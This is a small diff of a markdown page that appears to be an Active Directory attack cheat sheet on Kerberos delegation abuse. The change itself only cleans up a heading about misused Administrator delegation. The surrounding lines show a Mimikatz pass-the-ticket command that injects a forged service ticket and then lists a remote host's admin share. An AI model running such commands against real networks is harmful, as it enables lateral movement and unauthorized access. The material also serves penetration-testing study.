@@ -390,7 +390,7 @@ Invoke-Mimikatz -command '"kerberos::ptt filename_to_tgs_from_kekeo.kirbi"'
 ls \\host.dom.local\c$
 ```
 
-**Problem 2: Machine Account$ is used - If delegation is for non intrusive service but done with e.g Administrator, everything else with that user can be abused.user** &#x20;
+**Problem 2: Machine Account$ is used - If delegation is for non intrusive service but done with e.g Administrator, everything else with that user can be abused.**
 
 {% code overflow="wrap" %}
 ```powershell
